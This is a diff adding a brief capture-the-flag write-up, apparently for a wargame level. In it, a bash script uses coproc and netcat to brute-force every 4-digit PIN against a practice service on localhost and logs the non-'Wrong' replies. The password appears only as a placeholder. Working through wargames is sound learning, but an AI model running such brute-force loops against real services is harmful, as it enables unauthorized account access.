@@ -1,0 +1,25 @@
+24 -> 25
+
+So what we do is create this script using the coproc command to keep running the netcat TCP connection in a parallel shell we can comunicate to stdin and stdout of that shell through NC[0] and NC[1].
+
+This is the script:
+
+#!/bin/bash
+
+coproc NC { nc localhost 30002; }
+
+i=0
+for i in {0..10000};
+do
+        echo $i
+        PAD_NUMBER=$(printf "%04d\n" "$i")
+        PASSWORD="{previous_password} $PAD_NUMBER"
+        echo $PASSWORD >&"${NC[1]}"
+        read -r response <&"${NC[0]}"
+        echo "Number: $PASSWORD Response: $response"
+
+        if [[ $response != Wrong* ]] ;
+        then
+                echo $response >> password.txt
+        fi
+done
